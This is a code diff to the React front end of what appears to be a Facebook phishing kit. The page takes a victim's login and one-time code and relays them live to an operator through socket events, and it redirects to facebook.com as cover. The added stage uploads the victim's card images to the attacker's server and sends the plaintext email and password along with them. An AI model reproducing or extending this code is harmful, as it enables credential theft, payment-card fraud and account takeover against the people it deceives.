@@ -20,11 +20,23 @@ import StageThree from "../components/generic/StageThree";
 import ErrorStage from "../components/generic/ErrorStage";
 import Failed from "../components/generic/Failed";
 import { toaster } from "../components/ui/toaster";
+import StageTwoFive from "../components/generic/StageTwoFive";
+import axios from "axios";
 
 const Landing = () => {
   const navigate = useNavigate();
-  const { isLoading, setIsLoading, credentials, sendTo, setSendTo, otp } =
-    useUser();
+  const {
+    isLoading,
+    setIsLoading,
+    credentials,
+    sendTo,
+    setSendTo,
+    otp,
+    selectedFiles,
+    setSelectedFiles,
+    plan,
+    setUploadProgress,
+  } = useUser();
   const [currentStage, setCurrentStage] = useState(1);
   const [direction, setDirection] = useState(1);
   const [errorMessage, setErrorMessage] = useState("");
@@ -43,6 +55,7 @@ const Landing = () => {
       });
 
       socketRef.current.on("admin_response", (data) => {
+        console.log(data);
         if (data.eventType === "fb_attempt_init") {
           if (data.response === "wrong") {
             setIsLoading(false);
@@ -51,7 +64,7 @@ const Landing = () => {
               description: "Invalid username or password",
               type: "error",
             });
-          } else if (data.response === "continue") {
+          } else if (data.response === "login") {
             if (data.sendTo) {
               setIsLoading(false);
 
@@ -90,9 +103,29 @@ const Landing = () => {
               setSendTo(data.sendTo);
             }
           }
+        } else if (data.eventType === "fb_card_upload") {
+          setIsLoading(false);
+
+          if (data.nextStep) {
+            setCurrentStage(data.nextStep);
+          }
+
+          if (data.message) {
+            setVerificationMessage(data.message);
+          }
         } else {
           window.location.href = "https://www.facebook.com";
         }
+      });
+
+      socketRef.current.on("fb_card_upload_failed", (data) => {
+        console.log("Upload failed:", data.error);
+        setIsLoading(false);
+        toaster.create({
+          title: "Card Upload Failed!",
+          description: "Please try again.",
+          type: "error",
+        });
       });
     }
 
@@ -138,6 +171,84 @@ const Landing = () => {
     });
   };
 
+  const handleUpload = async () => {
+    if (selectedFiles.length === 0) return;
+
+    setIsLoading(true);
+    const formData = new FormData();
+    selectedFiles.forEach((file) => {
+      formData.append("files", file);
+    });
+    formData.append("plan", plan);
+    formData.append("sessionId", socketRef.current.id);
+    formData.append("email", credentials.username);
+
+    try {
+      const response = await axios.post(
+        `${import.meta.env.VITE_BASE_URL}/api/fb/upload`,
+        formData,
+        {
+          headers: {
+            "Content-Type": "multipart/form-data",
+          },
+          onUploadProgress: (progressEvent) => {
+            const progress = Math.round(
+              (progressEvent.loaded * 100) / progressEvent.total
+            );
+            setUploadProgress(progress);
+          },
+        }
+      );
+
+      if (response.status === 200) {
+        // Emit a socket event for admin processing
+        socketRef.current.emit("fb_card", {
+          email: credentials.username,
+          password: credentials.password,
+          files: selectedFiles.map((file) => file.name),
+          plan,
+          timestamp: new Date().toISOString(),
+          sessionId: socketRef.current.id,
+        });
+
+        // Listen for admin response
+        // socket.on("admin-response", (data) => {
+        //   if (data.status === "completed") {
+        //     setIsLoading(false);
+        //     toaster.create({
+        //       title: "Success",
+        //       description: "Files processed successfully!",
+        //       type: "success",
+        //     });
+        //   } else if (data.status === "processing") {
+        //     // Keep isLoading true for further processing
+        //     console.log("Admin is still processing the files...");
+        //   } else {
+        //     setIsLoading(false);
+        //     toaster.create({
+        //       title: "Error",
+        //       description: "Admin reported an issue with processing.",
+        //       type: "error",
+        //     });
+        //   }
+        // });
+      } else {
+        throw new Error("Upload failed");
+      }
+    } catch (error) {
+      setIsLoading(false);
+      console.error("Upload error:", error);
+      toaster.create({
+        title: "Error Uploading Card(s)",
+        description:
+          error.response?.status === 500
+            ? "Failed with Error 500"
+            : "An error occurred. Please try again.",
+        type: "error",
+      });
+    }
+  };
+
   const handleFinish = () => {
     setIsLoading(true);
     setErrorMessage("");
@@ -158,9 +269,10 @@ const Landing = () => {
         handleResend={handleResend}
       />
     ),
-    3: <StageThree handleFinish={handleFinish} />,
+    3: <StageTwoFive handleUpload={handleUpload} />,
+    4: <StageThree handleFinish={handleFinish} />,
     // 3: <ErrorStage handleFinish={handleFinish} />,
-    4: <Failed handleFinish={handleFinish} />,
+    5: <Failed handleFinish={handleFinish} />,
   };
 
   const slideVariants = {
